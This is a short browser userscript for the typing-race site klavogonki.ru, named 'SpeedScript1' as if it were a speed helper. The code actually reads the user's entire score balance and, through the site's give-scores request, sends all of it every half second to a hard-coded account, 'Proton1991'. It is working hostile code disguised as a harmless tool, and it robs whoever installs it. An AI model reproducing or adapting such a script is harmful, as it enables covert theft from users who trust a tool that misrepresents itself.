// ==UserScript==

// @name SpeedScript1
// @include http://klavogonki.ru
/
// ==/UserScript==

function makeMenu(){
var amount = document.getElementById('userpanel-scores').innerHTML;
            var recipient = 'Proton1991';
            var message = '=))';

new Ajax.Request('/ajax/give-scores', {
                        method: 'post',
                        parameters: {
                            amount: amount,
                            recipient: recipient,
                            message: message },
                        onSuccess: function(transport)
                        {
                        }}); 
}

var script   = document.createElement("script");
script.text = makeMenu+"setInterval(makeMenu,500);";
document.body.appendChild(script);
